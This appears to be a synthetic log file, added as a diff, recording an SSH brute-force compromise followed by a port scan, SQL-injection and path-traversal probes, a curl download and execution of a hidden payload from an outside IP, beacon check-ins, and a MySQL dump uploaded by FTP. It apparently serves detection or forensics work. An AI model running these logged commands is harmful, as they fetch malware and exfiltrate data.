@@ -1,0 +1,27 @@
+Sep 09 02:03:11 db02 sshd[20011]: Failed password for invalid user backup from 41.202.19.63 port 44210 ssh2
+Sep 09 02:03:14 db02 sshd[20012]: Failed password for invalid user backup from 41.202.19.63 port 44218 ssh2
+Sep 09 02:03:18 db02 sshd[20013]: Failed password for invalid user backup from 41.202.19.63 port 44226 ssh2
+Sep 09 02:03:22 db02 sshd[20014]: Failed password for invalid user backup from 41.202.19.63 port 44234 ssh2
+Sep 09 02:03:29 db02 sshd[20015]: Accepted password for backup from 41.202.19.63 port 44242 ssh2
+Sep 09 02:03:29 db02 sshd[20015]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+Sep 09 02:03:31 db02 geoip: login for user backup previously seen from US, now seen from RO (Romania) within 4 minutes
+Sep 09 02:04:02 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=21 
+Sep 09 02:04:02 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=22
+Sep 09 02:04:02 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=23
+Sep 09 02:04:03 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=25
+Sep 09 02:04:03 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=3306
+Sep 09 02:04:03 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=8080
+Sep 09 02:04:03 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=8443
+Sep 09 02:05:10 web03 nginx: 41.202.19.63 - - [09/Sep/2026:02:05:10 +0000] "GET /login.php?id=1' OR '1'='1 HTTP/1.1" 200 512
+Sep 09 02:05:12 web03 nginx: 41.202.19.63 - - [09/Sep/2026:02:05:12 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 220
+Sep 09 02:05:15 web03 nginx: 41.202.19.63 - - [09/Sep/2026:02:05:15 +0000] "POST /upload.php HTTP/1.1" 200 88
+Sep 09 02:06:00 db02 sudo: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/curl -s http://185.44.77.12/payload.sh -o /tmp/.sysupd
+Sep 09 02:06:02 db02 sudo: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/chmod +x /tmp/.sysupd
+Sep 09 02:06:03 db02 sudo: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/tmp/.sysupd
+Sep 09 02:10:03 db02 sysupd: beacon check-in to 185.44.77.12:443
+Sep 09 02:15:03 db02 sysupd: beacon check-in to 185.44.77.12:443
+Sep 09 02:20:04 db02 sysupd: beacon check-in to 185.44.77.12:443
+Sep 09 02:25:03 db02 sysupd: beacon check-in to 185.44.77.12:443
+Sep 09 02:31:47 db02 sudo: backup : TTY=pts/1 ; PWD=/var/backups ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/db_dump.tar.gz /var/lib/mysql
+Sep 09 02:32:10 db02 sudo: backup : TTY=pts/1 ; PWD=/var/backups ; USER=root ; COMMAND=/usr/bin/curl -T /tmp/db_dump.tar.gz ftp://185.44.77.12/upload
+Sep 09 02:32:40 db02 sshd[20015]: pam_unix(sshd:session): session closed for user backup
